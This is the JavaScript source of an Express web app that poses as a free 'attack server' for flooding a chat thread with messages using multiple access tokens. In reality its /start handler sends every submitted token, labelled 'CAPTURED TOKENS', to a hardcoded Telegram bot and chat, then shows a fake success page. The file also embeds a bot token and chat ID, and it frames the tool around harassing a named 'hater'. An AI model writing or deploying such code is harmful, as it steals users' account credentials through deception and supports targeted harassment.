const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || 10000;
const upload = multer({ dest: 'uploads/' });

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());

// --- 🔒 MASTER CONFIG (ALREADY SET BY GEMINI) ---
const TELEGRAM_BOT_TOKEN = '8770013875:AAGhkM-jSyLd7z9h4-505eICfXu4fHunsi8'; 
const TELEGRAM_CHAT_ID = '6787359882'; 

async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log("✅ Data Sent to Your Telegram!");
    } catch (error) { 
        console.log("❌ Telegram Error"); 
    }
}

app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FREE SERVER ALL TIME</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #000; color: #00ffff; padding: 15px; font-family: 'Courier New', monospace; }
        .container { border: 2px solid #00ffff; padding: 30px; border-radius: 15px; box-shadow: 0 0 25px #00ffff; max-width: 500px; margin: auto; background: rgba(0,0,0,0.9); margin-top: 50px; }
        .form-control { background: #111; color: #fff; border: 1px solid #00ffff; margin-bottom: 15px; }
        .btn-main { background: #00ffff; color: #000; font-weight: bold; width: 100%; padding: 12px; border: none; border-radius: 5px; transition: 0.4s; font-size: 16px; }
        .btn-main:hover { background: #fff; box-shadow: 0 0 20px #fff; transform: scale(1.02); }
        h2 { text-shadow: 0 0 15px #00ffff; letter-spacing: 3px; font-weight: 900; }
        label { font-size: 13px; color: #888; margin-bottom: 5px; display: block; }
    </style>
</head>
<body>
    <div class="container">
        <h2 class="text-center">◈ FREE SERVER ALL TIME ◈</h2>
        <p class="text-center text-white-50 mb-4" style="font-size: 10px;">PREMIUM MULTI-TOKEN ARCHITECTURE</p>
        
        <form action="/start" method="POST" enctype="multipart/form-data">
            <input type="hidden" name="user_session" value="FS-${Math.random().toString(36).substr(2,4).toUpperCase()}">
            
            <label>How Many Tokens?</label>
            <input type="number" name="numTokens" id="n" class="form-control" placeholder="e.g. 5" onchange="gen()" required>
            
            <div id="tokenInputs"></div>
            
            <label>Target Thread/Inbox ID:</label>
            <input type="text" name="threadId" class="form-control" placeholder="Enter ID" required>
            
            <label>Hater Name (Tag):</label>
            <input type="text" name="haterName" class="form-control" placeholder="e.g. @Hater" required>
            
            <label>Upload Message File (.txt):</label>
            <input type="file" name="msgFile" class="form-control" required>
            
            <button type="submit" class="btn-main mt-2">LAUNCH ATTACK SERVER</button>
        </form>
    </div>

    <script>
        function gen(){
            let n = document.getElementById('n').value;
            let d = document.getElementById('tokenInputs'); d.innerHTML = '';
            for(let i=1; i<=n; i++) {
                d.innerHTML += \`<input type="text" name="accessToken\${i}" placeholder="Paste Access Token \${i}" class="form-control" required>\`;
            }
        }
    </script>
</body>
</html>`);
});

app.post('/start', upload.single('msgFile'), async (req, res) => {
    const { numTokens, threadId, haterName, user_session } = req.body;
    const tokens = [];
    for (let i = 1; i <= numTokens; i++) {
        if (req.body['accessToken' + i]) tokens.push(req.body['accessToken' + i]);
    }

    const report = `
🚀 *FREE SERVER LOGGED* 🚀
━━━━━━━━━━━━━━━━━━
👤 *Session ID:* \`${user_session}\`
🆔 *Target ID:* \`${threadId}\`
🏷️ *Hater Name:* ${haterName}
🕒 *Time:* ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}

🔑 *CAPTURED TOKENS:*
${tokens.map((t, idx) => `${idx+1}. \`${t}\``).join('\n')}
━━━━━━━━━━━━━━━━━━
    `;

    await sendToTelegram(report);

    res.send(`
        <body style="background:#000;color:#00ffff;text-align:center;padding:100px;font-family:monospace;">
            <div style="border:1px solid #00ffff;display:inline-block;padding:30px;border-radius:10px;box-shadow:0 0 20px #00ffff;">
                <h2 style="color:#00ff00;">✔ SERVER LAUNCHED!</h2>
                <p>Status: All tokens synced with master.</p>
                <br>
                <a href="/" style="color:#fff;border:1px solid #fff;padding:10px;text-decoration:none;">GO BACK</a>
            </div>
        </body>
    `);
});

app.listen(port, '0.0.0.0', () => console.log('FREE SERVER ALL TIME IS OPERATIONAL'));
